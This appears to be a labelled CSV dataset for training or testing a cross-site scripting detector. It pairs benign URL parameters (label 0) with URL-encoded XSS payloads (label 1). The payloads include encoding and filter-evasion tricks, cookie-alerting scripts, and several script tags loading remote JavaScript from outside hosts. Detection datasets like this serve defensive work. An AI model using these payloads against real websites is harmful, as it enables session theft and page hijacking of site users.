text,label
/JSP?loggedout=%3Cimg%20src%3D%22mocha%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/banner2?substruc=%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text/html%3B%20charset%3DUTF-7%22%3E%20%3C/HEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-/SCRIPT%2BAD4-,1
/1886411743?blogbody=%3Capplet%20onreadystatechange%20applet%20onreadystatechange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/applet%20onreadystatechange%3E,1
/3037886?quote=quote,0
/sunbelt_logo2?tasks=%3Cdiv%20STYLE%3D%22background-image%3A%20url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%22%3E,1
/bbw?loader=loader,0
/quickquote_title?mysqls=%3CBODY%20ONLOAD%3Djavascript%3Ajavascript%3Aalert%281%29%3E,1
/book%20%2D%20computer%20%2D%20perl?UserType=UserType,0
/finally?featured=%3CIMG%20SRC%3Dx%20oncuechange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/5903?unzip=unzip,0
/udell?CKEditor=CKEditor,0
/adam_hofstetter?showact=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/anonymous?test=%3CDIV%20STYLE%3D%22width%3A%20expression%28alert%28%27XSS%27%29%29%3B%22%3E,1
/8298?license=license,0
/6852?sqlportb4=sqlportb4,0
/119157?cookielength=%3CSCRIPT%20a%3D%22%3E%22%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/1709?pguser=%3CBASE%20HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B//%22%3E,1
/2005-24?FXuser=%26lt%3BA%20HREF%3D%26quot%3Bjavascript%3Adocument.location%3D%26apos%3Bhttp%3A//www.google.com/%26apos%3B%26quot%3B%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/375?mc=mc,0
/Cooking?LostPasswordForm=LostPasswordForm,0
/obrien?imdbID=%3CIMG%20SRC%3D%60javascript%3Aalert%28%22RSnake%20says%2C%20%27XSS%27%22%29%60%3E,1
/3688?downloaD=downloaD,0
/handycam?cp=cp,0
/sidenav?perms0=%3Ca%20href%3D%22javas%5Cx02cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/12033?Update=Update,0
/29223?initial=initial,0
/Customers?colName=colName,0
/A58?remoteserver=%3Ca%20href%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Bcookie%26rpar%3B%3EClick%20Here%3C/a%3E,1
/responding?ggid=ggid,0
/in-notes?bindpw=bindpw,0
/2170368?confirmation=%3CIMG%20SRC%3Dx%20onstalled%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/see_comments?pName=pName,0
/24761?goback=goback,0
/5453?supplierPhone=supplierPhone,0
/testerschallenge?gpsselect=gpsselect,0
/yagi?editprofile=editprofile,0
/s-tools?layoutType=%3CINPUT%20TYPE%3D%22BUTTON%22%20action%3D%22alert%28%27XSS%27%29%22/%3E,1
/5079?ParentPage=%21--%22%20/%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C/script%3E,1
/INFO?quoteid=quoteid,0
/counselors?reports=%3Cdiv%20id%3D%22x%22%3EXXX%3C/div%3E%20%3Cstyle%3E%20%20%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D%20%20%23y%5D%3Bcolor%3Ared%3B%7B%7D%20%20%3C/style%3E,1
/fid?Object=%3CINPUT%20TYPE%3D%E2%80%9DIMAGE%E2%80%9D%20SRC%3D%E2%80%9Djavascript%3Aalert%28%E2%80%98XSS%E2%80%99%29%3B%E2%80%9D%3E,1
/atb?credit=credit,0
/043?newstatus=newstatus,0
/buttonB?txtCaptcha=txtCaptcha,0
/001804?searchtext=searchtext,0
/002478?serverurl=serverurl,0
/LWP?pg=%26lt%3BMETA%20HTTP-EQUIV%3D%5C%22Set-Cookie%5C%22%20Content%3D%5C%22USERID%3D%26lt%3BSCRIPT%26gt%3Balert%28%27XSS%27%29%26lt%3B/SCRIPT%26gt%3B%5C%22%26gt%3B,1
/0221?itemname=itemname,0
/XHTML?permStatus=permStatus,0
/3972?demolish=%3Cscript%2Bsrc%3D%22%3E%22%2Bsrc%3D%22http%3A//yoursite.com/xss.js%3F69%2C69%22%3E%3C/script%3E,1
/56555?m3uartist=m3uartist,0
/Singles?collTypeID=%26lt%3BA%20HREF%3D%5C%22javascript%26%23058%3Bdocument%26%2346%3Blocation%3D%27http%26%2358%3B//www%26%2346%3Bgoogle%26%2346%3Bcom/%27%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/2834?menuid=a%3D%26quot%3Bget%26quot%3B%3B%26amp%3B%2310%3Bb%3D%26quot%3BURL%28%26quot%3B%26quot%3B%3B%26amp%3B%2310%3Bc%3D%26quot%3Bjavascript%3A%26quot%3B%3B%26amp%3B%2310%3Bd%3D%26quot%3Balert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%29%26quot%3B%3B%26%2310%3Beval%28a%2Bb%2Bc%2Bd%29%3B,1
/marriage?pageop=pageop,0
/31117?dlPath=%3CBODY%20ONLOAD%3Dalert%28%27XSS%27%29%3E,1
/179?referid=referid,0
/5095?flushcache=flushcache,0
/faq5?fg=fg,0
/Tiger?pub=pub,0
/102495?althostnames=althostnames,0
/Korean?remhrs=%3Cstyle%3E%3C/style%5Cx0A%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,1
/21295?mybbindex=%25253cscript%25253ealert%281%29%25253c/script%25253e,1
/ichat?subdom=%3C%21--%5Cx3E%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E,1
/FSM?period=period,0
/main_02?bio=bio,0
/0159?sha1=%3CIMG%20SRC%3Dx%20onresize%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/gp?disablecarp=disablecarp,0
/8003?exT=exT,0
/33395?lastActive=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E,1
/Comic?stateid=%3Cisindex/autofocus/onfocus%3Dalert%28%29%3E,1
/Cucusoft?fileContent=fileContent,0
/f20?getm=getm,0
/002240?makedir=makedir,0
/ecp?smtpssl=%3Cimg%20src%20onerror%20/%22%20%27%22%3D%20alt%3Djavascript%3Aalert%281%29//%22%3E,1
/cat-bewerbung?bits=bits,0
/3648826?sentitems=%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/100guarWebtechgeek?darezz=%3Cinput%20value%3D%3C%3E%3Ciframe/src%3Djavascript%3Aconfirm%281%29,1
/adcenter?reveal=%3CSTYLE%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EXSS%3C/br%3E,1
/68080?affiliate=affiliate,0
/16434?searchadvcat=searchadvcat,0
/getmore?autoaddfields=autoaddfields,0
/ActivePerl-5?bogonsinterval=%3Ccomment%3E%3Cimg%20src%3D%22%3C/comment%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29%29//%22%3E,1
/filetransit?step4=%22%27%60%3E%3C%5Cx3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E,1
/cryptolo?sqlportb4=%3Cbody%20onMouseOver%20body%20onMouseOver%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onMouseOver%3E,1
/ehcache?u32=u32,0
/Land%20Rover?searchadvcat=searchadvcat,0
/connector-j?profiler=%3C%3Bbr%20size%3D%5C%22%3B%26%3B%7Balert%28%26%23039%3BXSS%26%23039%3B%29%7D%5C%22%3B%3E%3B,1
/analisis?pathf=%3Ca%20href%3D%22%5Cx06javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/242870?deletepms=deletepms,0
/navtop-bg?collectionfrom=%27%3E%3C/select%3E%3Cscript%3Ealert%28123%29%3C/script%3E,1
/RedHat?width=%27%22%60%3E%3Cscript%3E/%2A%20%2A%5Cx2Fjavascript%3Aalert%281%29//%20%2A/%3C/script%3E,1
/bullit?reveal=%3Ccomment%3E%3Cimg%20src%3D%22%3C/comment%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29%29//%22%3E,1
/HTML_Table?workerId=%3Cobject%20type%3D%22text/x-scriptlet%22%20data%3D%22http%3A//jsfiddle.net/XLE63/%20%22%3E%3C/object%3E,1
/prep?stack=stack,0
/Gordon?dtend=%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%22%3E,1
/3037964?popup=%26%23x00003C%3B,1
/P%C3%A1gina_principal?binding=%3CIMG%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/securing?filefrom=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx81javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/rugby_union?enc=%3Cscript/src%3D%22data%26colon%3Btext%252Fj%5Cu0061v%5Cu0061script%2C%5Cu0061lert%28%27%5Cu0061%27%29%22%3E%3C/script%20a%3D%5Cu0061%20%26%20/%3D%252F,1
/17431?workflow=workflow,0
/49471?inside=%22/%3E%3Cimg/onerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax%20/%3E,1
/001887?menutitle=%3Ca%20href%3D%22%5Cx1Cjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/usatoday-com?organization=organization,0
/Lang?fType=fType,0
/piper?auid=%3CIMG%20SRC%3D%22livescript%3A%5Bcode%5D%22%3E,1
/Biometrie?b=%5C%22%3Bdocument.vulnerable%3Dtrue%3B%3B//,1
/linkout?sw=sw,0
/sickening?wpas=wpas,0
/Undergrad?gids=gids,0
/19160?limitless=limitless,0
/cpolewarczyk-d2?criteriaRowInsert=criteriaRowInsert,0
/fanclub?dlPath=%3C%3BOBJECT%20classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3B%3C%3Bparam%20name%3Durl%20value%3Djavascript%3Aalert%28%27%3BXSS%27%3B%29%3E%3B%3C%3B/OBJECT%3E%3B,1
/login_chunkx?attachmentsid=attachmentsid,0
/opennews?backuparea=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx88expression%28javascript%3Aalert%281%29%22%3EDEF,1
/logic?inid=%27%22%22%3E%3Cscript%20language%3D%22JavaScript%22%3E%20alert%28%27X%20%5CnS%20%5CnS%27%29%3B%3C/script%3E,1
/bf_new?dnssecstripped=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx0Donerror%3Djavascript%3Aalert%281%29%3E,1
/cze?idc=%3Cdiv%20style%3D%22background-image%3A%20url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E,1
/3660?downchange=%3Cimg%20src%3Dx%5Cx13onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/sala?crtty=crtty,0
/gy?projectid=%3Cimg%20%5Cx47src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/truste_partner?replace=replace,0
/40257?episode=%3CIMG%20SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E,1
/TroubleshootingStartupErrors?Save=Save,0
/companyprofile?dest=dest,0
/cat_google?coppaPost=coppaPost,0
/11919?interfaces=%26lt%3BSTYLE%26gt%3B.XSS%7Bbackground-image%3Aurl%28%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%26quot%3B%29%3B%7D%26lt%3B/STYLE%26gt%3B%26lt%3BA%20CLASS%3DXSS%26gt%3B%26lt%3B/A%26gt%3B,1
/emailnewsletters?nodeid=nodeid,0
/35998?passwords=%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%22%3E,1
/CountryLanguage?tt=%3Cscript/src%3Ddata%26colon%3Btext/j%5Cu0061v%5Cu0061%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%2C%5Cu0061%256C%2565%2572%2574%28/XSS/%29%3E%3C/script,1
/refrigerators?sessid=%3C%3BSTYLE%3E%3Bli%20%7Blist-style-image%3A%20url%28%22%3Bjavascript%3Aalert%28%26%2339%3BXSS%26%2339%3B%29%22%3B%29%3B%7D%3C%3B/STYLE%3E%3B%3C%3BUL%3E%3B%3C%3BLI%3E%3BXSS,1
/chapter?break=%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C/FRAMESET%3E,1
/gale?vhid=%3CSCRIPT%20a%3D%22%3E%27%3E%22%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/newsbymsa?authmode=authmode,0
/head_search?debug3=debug3,0
/msg00146?rname=rname,0
/button-php?doimage=%3Cimg%5Cx10src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/953970613?stp=%3C%21--%5Bif%20gte%20IE%204%5D%3E%3CSCRIPT%3Ejavascript%3Aalert%281%29%3B%3C/SCRIPT%3E%3C%21%5Bendif%5D--%3E,1
/worldtv?graphlot=graphlot,0
/7784?track=%3Ciframe/onreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E,1
/14312?modid=modid,0
/17485?To=To,0
/panels?nfid=nfid,0
/garbage?subact=subact,0
/98971?due=%22/%3E%3Cimg/onerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax%20/%3E,1
/000527?id5gid=id5gid,0
/9193?totalItems=%26lt%3BA%20HREF%3D%5C%22http%26%2358%3B//www%26%2346%3Bgohttp%26%2358%3B//www%26%2346%3Bgoogle%26%2346%3Bcom/ogle%26%2346%3Bcom/%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/mobil2?saveasdraft=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx83javascript%3Aalert%281%29%3C/script%3E,1
/antimalware?domainsearchlist=%3CIMG%20SRC%3Dx%20oninput%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/873178?STRUCTURE=%3Cform%3E%3Ctextarea%20%26%2313%3B%20onkeyup%3D%27%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%26%23x28%3B1%26%23x29%3B%27%3E,1
/netbus?cartId=cartId,0
/spam_en?overrideID=overrideID,0
/494?recommend=%26lt%3BIMG%20SRC%3D%26quot%3Bhttp%3A//www.thesiteyouareon.com/somecommand.php%3Fsomevariables%3Dmaliciouscode%26quot%3B%26gt%3B,1
/pixy?phpsettingid=phpsettingid,0
/filler-white?uporder=%3Cimg%20DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/6825?scan=scan,0
/143844?spelling=%3Cstyle%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Adocument.vulnerable%3Dtrue%22%29%3B%7D%3C/STYLE%3E%3CA%20CLASS%3DXSS%3E%3C/a%3E,1
/barclays?throttle=throttle,0
/34453?encrypted=%3Csvg%20onUnload%20svg%20onUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/svg%20onUnload%3E,1
/callofduty2?mip=mip,0
/pagetops?data2=%3CIMG%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22,1
/wat?mobj=mobj,0
/Ouch?wbp=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx09onerror%3Djavascript%3Aalert%281%29%3E,1
/67421?quoteid=quoteid,0
/6-1?unique=unique,0
/8584?dateExpected=dateExpected,0
/investors?ntp1=ntp1,0
/competence?domaiN=%3C%3BA%20HREF%3D%22%3Bhttp%3A//66.102.7.147/%22%3B%3E%3BXSS%3C%3B/A%3E%3B,1
/incident?dlt=%3CBGSOUND%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/2stars-sFFDD81?certificate=%3Cbody%20onkeyup%20body%20onkeyup%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onkeyup%3E,1
/30843?response=%3C%25%20foo%3E%3Cx%20foo%3D%22%25%3E%3Cscript%3Ealert%28123%29%3C/script%3E%22%3E,1
/gcc?saveoptions=%3Cscript%3E%2B-%2B-1-%2B-%2Balert%281%29%3C/script%3E,1
/Vendors?ef=%22%3E%3Cscript%3Ealert%28%22XSS%20by%20%5Cnxss%22%29%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C/h1%3E%3C/marquee%3E,1
/icsa?jsonp=%3Cscript%5Cx2Ftype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/panic?CHOICE=%3Cinput%20type%3D%22image%22%20dynsrc%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/nu?proxypass=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx00onerror%3Djavascript%3Aalert%281%29%3E,1
/110940?ver2=ver2,0
/3356?preg=preg,0
/landlord?newsid=newsid,0
/MarketsHome?setting=setting,0
/strona_14?mybulletin=mybulletin,0
/module-anydbm?reflectiontimeout=reflectiontimeout,0
/orderinfo?perPage=%26%2334%3B%26%2362%3B%3Ch1/onmouseover%3D%27%5Cu0061lert%281%29%27%3E%2500,1
/live_stats?fontSize=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5CxA9javascript%3Aalert%281%29%3C/script%3E,1
/001788?utm_campaign=--%3E%3C%21--%20---%3E%20%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E,1
/Profiles?AddressResult=%3Cimg%20dynsrc%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/borner_small?viewtype=viewtype,0
/camera-flash?activate=%22/%3E%3Cimg/onerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax%20/%3E,1
/north_dakota?changed=%3CMETA%20HTTP-EQUIV%3D%5C%22refresh%5C%22%20CONTENT%3D%5C%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E,1
/riding?minkills=%26lt%3BIMG%20SRC%3D%5C%22jav%26%23x0A%3Bascript%26%23058%3Balert%28%27XSS%27%29%3B%5C%22%26gt%3B,1
/az?searchString=searchString,0
/242716?pl=%3Cscript%5Cx3Etype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/7159?qa=qa,0
/26911?orionprofile=%3Ciframe/onreadystatechange%3Dalert%281%29,1
/habit?sabsetting=sabsetting,0
/46351?fs=%3Cimg%20src%3D%23%20onerror%5Cx3D%22javascript%3Aalert%281%29%22%20%3E,1
/yoda_backpack?tp=%22%60%27%3E%3Cscript%3E%5Cx3Bjavascript%3Aalert%281%29%3C/script%3E,1
/mt-comments?wwname=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx85javascript%3Aalert%281%29%3C/script%3E,1
/Los-Angeles?pageId=pageId,0
/0735613788?records=records,0
/2681?ppsstratum=ppsstratum,0
/20105?Perms=Perms,0
/51836?imagedetails=imagedetails,0
/Filters?userAgent=userAgent,0
/greenbar?inifile=%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E,1
/docu?load=load,0
/6429?leave=foo%5C%E2%80%99%3B%20alert%28document.cookie%29%3B//%E2%80%99%3B,1
/3980?pickfieldlabel=%3Cscript/%26Tab%3B%20src%3D%27https%3A//dl.dropbox.com/u/13018058/js.js%27%20/%26Tab%3B%3E%3C/script%3E,1
/coche?prj=%3C/textarea%3E%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,1
/casualty?campaignid=%22%60%27%3E%3Cscript%3E%5Cx0Cjavascript%3Aalert%281%29%3C/script%3E,1
/3450?typ=typ,0
/infothought?fldname=fldname,0
/moneymag?filtertext=filtertext,0
/143159?mru=mru,0
/30699?topicsperpage=%3CIMG%20SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E,1
/TracBrowser?tx=tx,0
/blumenshop?makenote=makenote,0
/shadow_bottom?processlogin=processlogin,0
/skasuj_blue2?ident=ident,0
/masthead3?favourite=favourite,0
/hopp?disablechecksumoffloading=disablechecksumoffloading,0
/3191?imagE=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/nowak?dnpipe=%3CIMG%20SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E,1
/100best?subtotal=subtotal,0
/3877?toggle=toggle,0
/53727?catid=catid,0
/Frontier?byfc9=byfc9,0
/tan3-save10?sw=%3Cimg%20src%3Dx%20onerror%3D%5Cx32%22javascript%3Aalert%281%29%22%3E,1
/7294?xx=xx,0
/3764?saveZ=saveZ,0
/304310?disablefilter=%3Ca%20href%3D%22javas%5Cx04cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/sanitize?purchaseid=purchaseid,0
/subcommittees?sqluser=%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Ddata%3Atext/html%20base64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E,1
/borden?senm=senm,0
/footer_aurora?tempLoanID=tempLoanID,0
/Google-Talk?remail=remail,0
/linux_magazine?proxyurl=%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%5Cx0D,1
/4145?syntax=perl%20-e%20%27print%20%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C/SCR%5C0IPT%3E%5C%22%3B%27%20%3E%20out,1
/cheatsheets?returnurl=returnurl,0
/hom?tc=tc,0
/i-fy98?saveNcreate=%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%601%60%29%3E,1
/5016?signatures=%3CSCRIPT%3Ea%3D/XSS/alert%28a.source%29%3C/SCRIPT%3E,1
/webhopper1_small?ProfileForm=%3C%3BIMG%20LOWSRC%3D%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B,1
/externalEdit_?condition=%3CSCRIPT%20FOR%3Ddocument%20EVENT%3Donreadystatechange%3Ejavascript%3Aalert%281%29%3C/SCRIPT%3E,1
/unwireapt?finesDate=%3Cbody%20onPageHide%20body%20onPageHide%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onPageHide%3E,1
/adcontact?4=%3Cscript%5Cx2Ftype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/showlinks?shortname=%26lt%3BSCRIPT%20%5C%22a%3D%27%26gt%3B%27%5C%22%20SRC%3D%5C%22http%26%2358%3B//ha%26%2346%3Bckers%26%2346%3Borg/xss%26%2346%3Bjs%5C%22%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/spiegel?showdupes=showdupes,0
/redneck?reorder=%3Cdiv/style%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C/div%3E%20%7BIE7%7D,1
/51867?dxmode=%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/sld009?zipcode=zipcode,0
/9189?fileoffset=%26lt%3BMETA%20HTTP-EQUIV%3D%26quot%3Brefresh%26quot%3B%20CONTENT%3D%26quot%3B0%3Burl%3Ddata%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%26quot%3B%26gt%3B,1
/news_center?crefile=crefile,0
/36247?bwdefaultdn=%3CSCRIPT%20SRC%3D%22http%3A//ha.ckers.org/xss.jpg%22%3E%3C/SCRIPT%3E,1
/Foothills?key=key,0
/craagle?daemon=%22/%3E%3Cimg/onerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax%20/%3E,1
/artwork?itemStatusID=itemStatusID,0
/faq8?tot=tot,0
/icon_slashdot?notrap=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx88javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/10133?id10level=id10level,0
/Justin_Troutman?rxantenna=rxantenna,0
/help_e?radiusip4=radiusip4,0
/top_in?adminpass=adminpass,0
/15877?newsletter=newsletter,0
/cdbs?fType=%3Ca%20href%3D%22jav%26%2365ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C/a%3E,1
/wd-news?authorName=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx87javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/search_ediuspro4?logfile=logfile,0
/rsshelp?RelayState=%3Cimg%20src%3Dx%20onerror%3D%5Cx12%22javascript%3Aalert%281%29%22%3E,1
/netdude?langname=langname,0
/0112-exploits?pollOptions=pollOptions,0
/progRefer?progresskey=progresskey,0
/14147?searchUsername=searchUsername,0
/redhat?eventDate=%3Cimg%20%5Cx11src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/defcon10?managerlanguage=exp/%2A%26lt%3BA%20STYLE%3D%27no%5Cxss%26%2358%3Bnoxss%28%5C%22%2A//%2A%5C%22%29%3B,1
/icon_webhosting?maxUploadSize=%3C/TITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C/SCRIPT%3E,1
/hot_site?pm=%3Clink%20REL%3D%22stylesheet%22%20HREF%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/gc?FIELDS=FIELDS,0
/001377?ham=%3C/XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28alert%28%27XSS%27%29%29%3E,1
/5843?orientation=orientation,0
/firstgov_logo?enforceHTTPS=/%2Aiframe/src%2A/%3Ciframe/src%3D%22%3Ciframe/src%3D%40%22/onload%3Dprompt%281%29%20/%2Aiframe/src%2A/%3E,1
/cctld-whois?pruningOptions=pruningOptions,0
/1606?source=source,0
/25232?TO=%3Ciframe%20src%3Dhttp%3A//ha.ckers.org/scriptlet.html%20%3C,1
/Korean?zipName=%5Cx3C,1
/shotgun?pipi=%3Cscript%20/%2A%2A/%3E/%2A%2A/alert%281%29/%2A%2A/%3C/script%20/%2A%2A/,1
/b11?support=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A//%2A/%2A/pression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B,1
/41879?backconnectport=%3Cscript%20~~~%3Ealert%280%250%29%3C/script%20~~~%3E,1
/wakefield?flush=%3Csvg%20contentScriptType%3Dtext/vbs%3E%3Cscript%3EMsgBox%2B1,1
